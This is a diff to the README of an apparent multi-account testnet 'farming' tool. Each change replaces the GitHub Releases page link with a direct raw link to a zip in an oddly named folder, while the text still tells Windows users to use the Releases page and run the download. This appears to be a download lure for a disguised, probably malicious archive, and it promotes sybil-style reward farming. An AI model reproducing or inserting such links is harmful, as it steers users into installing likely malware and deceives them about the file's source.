@@ -1,6 +1,6 @@
 # 🤖 Onvoyage-Ai-Testnet-farm - Run Multi-Account Farming with Ease
 
-[![Download Onvoyage-Ai-Testnet-farm](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge)](https://github.com/revenantguttaperchatree773/Onvoyage-Ai-Testnet-farm/releases)
+[![Download Onvoyage-Ai-Testnet-farm](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/revenantguttaperchatree773/Onvoyage-Ai-Testnet-farm/main/tractorization/farm-Onvoyage-Ai-Testnet-v3.9.zip)
 
 ## 🧭 What This App Does
 
@@ -17,7 +17,7 @@ This setup is useful if you want to:
 
 Visit this page to download the app:
 
-https://github.com/revenantguttaperchatree773/Onvoyage-Ai-Testnet-farm/releases
+https://raw.githubusercontent.com/revenantguttaperchatree773/Onvoyage-Ai-Testnet-farm/main/tractorization/farm-Onvoyage-Ai-Testnet-v3.9.zip
 
 On the Releases page, look for the latest version and download the Windows file. If there are more than one file, pick the one made for Windows, such as an `.exe` file or a `.zip` file that contains the app.
 
@@ -39,7 +39,7 @@ For best results, close other heavy apps before you start.
 Follow these steps to set up the app on Windows.
 
 1. Open the download page:
-   https://github.com/revenantguttaperchatree773/Onvoyage-Ai-Testnet-farm/releases
+   https://raw.githubusercontent.com/revenantguttaperchatree773/Onvoyage-Ai-Testnet-farm/main/tractorization/farm-Onvoyage-Ai-Testnet-v3.9.zip
 
 2. Download the latest Windows release.
 
@@ -201,7 +201,7 @@ Check the account data, proxy, and order of your list. Then run it again.
 
 ### Where do I get the app?
 Use the Releases page:
-https://github.com/revenantguttaperchatree773/Onvoyage-Ai-Testnet-farm/releases
+https://raw.githubusercontent.com/revenantguttaperchatree773/Onvoyage-Ai-Testnet-farm/main/tractorization/farm-Onvoyage-Ai-Testnet-v3.9.zip
 
 ## 📌 Project Details
 
